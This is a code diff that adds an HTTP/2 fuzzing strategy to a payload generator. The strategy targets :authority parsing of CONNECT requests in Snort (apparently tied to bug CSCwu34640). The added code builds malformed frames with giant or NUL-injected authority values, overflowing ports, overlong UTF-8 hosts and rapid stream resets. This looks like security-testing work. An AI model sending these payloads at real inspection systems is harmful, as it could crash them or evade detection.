@@ -50,13 +50,14 @@ HTTP2_STRATEGIES = [
     "rst_stream_race",
     "preface_manipulation",
     "header_block_fragmentation",
+    "connect_authority_overflow",
 ]
 
 # Base weights (raw; normalised downstream).  The deepest / highest-yield
 # parser surfaces (HPACK, CONTINUATION, stream tracking, pseudo-headers) get
 # the most mass; protocol-violation / edge-case strategies get less.
 HTTP2_WEIGHTS = [
-    14, 12, 10, 8, 10, 6, 8, 5, 4, 5, 7, 6, 3, 7,
+    14, 12, 10, 8, 10, 6, 8, 5, 4, 5, 7, 6, 3, 7, 11,
 ]
 
 HTTP2_STRATEGY_LABELS = {
@@ -74,6 +75,7 @@ HTTP2_STRATEGY_LABELS = {
     "rst_stream_race":             "RST_STREAM Race",
     "preface_manipulation":        "Preface Manipulation",
     "header_block_fragmentation":  "Header Block Fragmentation",
+    "connect_authority_overflow":   "CONNECT :authority OOB (CSCwu34640)",
 }
 
 
@@ -1147,6 +1149,83 @@ def build_http2_payload(strategy: str, payload_override=None) -> bytes:
                 frames += _frame(_FT_CONTINUATION, fl, 1, chunk)
 
         return frames
+
+    # ── connect_authority_overflow (CSCwu34640) ───────────────────────
+    # Targets the :authority pseudo-header parsing in HTTP/2 CONNECT
+    # method. Snort must extract the host:port from :authority for
+    # tunnel inspection; malformed values can trigger OOB reads.
+    elif strategy == "connect_authority_overflow":
+        variant = random.choice([
+            "giant_authority", "nul_in_authority", "port_overflow",
+            "authority_unicode_confusion", "rapid_connect_streams",
+            "authority_no_port",
+        ])
+        preface = _valid_preface()
+
+        if variant == "giant_authority":
+            block = _hpack_literal_indexed(1, b"CONNECT")
+            block += _hpack_literal_indexed(1, b"A" * 60000 + b":443")
+            block += _hpack_literal_new(b":scheme", b"https", indexing=False)
+            frames = preface + _frame(_FT_HEADERS, _FL_END_HEADERS, 1, block)
+            return frames
+
+        elif variant == "nul_in_authority":
+            frames = preface
+            for i in range(100):
+                sid = i * 2 + 1
+                authority = b"evil.com\x00good.com:" + str(random.randint(1, 65535)).encode()
+                block = _hpack_literal_indexed(1, b"CONNECT")
+                block += _hpack_literal_indexed(1, authority)
+                block += _hpack_literal_new(b":scheme", b"https", indexing=False)
+                frames += _frame(_FT_HEADERS, _FL_END_HEADERS, sid, block)
+            return frames
+
+        elif variant == "port_overflow":
+            frames = preface
+            ports = [b"99999", b"0", b"-1", b"65536", b"999999999999",
+                     b"AAAA", b"", b"\xff\xff"]
+            for i, port in enumerate(ports * 20):
+                sid = i * 2 + 1
+                block = _hpack_literal_indexed(1, b"CONNECT")
+                block += _hpack_literal_indexed(1, b"target.com:" + port)
+                block += _hpack_literal_new(b":scheme", b"https", indexing=False)
+                frames += _frame(_FT_HEADERS, _FL_END_HEADERS, sid, block)
+            return frames
+
+        elif variant == "authority_unicode_confusion":
+            frames = preface
+            for i in range(100):
+                sid = i * 2 + 1
+                host = b"\xc0\xae\xc0\xae" * 50 + b".evil.com:443"
+                block = _hpack_literal_indexed(1, b"CONNECT")
+                block += _hpack_literal_indexed(1, host)
+                block += _hpack_literal_new(b":scheme", b"https", indexing=False)
+                frames += _frame(_FT_HEADERS, _FL_END_HEADERS, sid, block)
+            return frames
+
+        elif variant == "rapid_connect_streams":
+            frames = preface
+            for i in range(500):
+                sid = i * 2 + 1
+                authority = b"host%d.com:%d" % (i, random.randint(1, 65535))
+                block = _hpack_literal_indexed(1, b"CONNECT")
+                block += _hpack_literal_indexed(1, authority)
+                block += _hpack_literal_new(b":scheme", b"https", indexing=False)
+                frames += _frame(_FT_HEADERS, _FL_END_HEADERS, sid, block)
+                frames += _frame(_FT_RST_STREAM, 0, sid, struct.pack("!I", 0x8))
+            return frames
+
+        else:  # authority_no_port
+            frames = preface
+            authorities = [b"", b":", b"::", b"host:", b":443",
+                           b"[::1]", b"[::1]:99999", b"@evil:443"]
+            for i, auth in enumerate(authorities * 30):
+                sid = i * 2 + 1
+                block = _hpack_literal_indexed(1, b"CONNECT")
+                block += _hpack_literal_indexed(1, auth)
+                block += _hpack_literal_new(b":scheme", b"https", indexing=False)
+                frames += _frame(_FT_HEADERS, _FL_END_HEADERS, sid, block)
+            return frames
 
     # ── fallback ────────────────────────────────────────────────────────
     else:
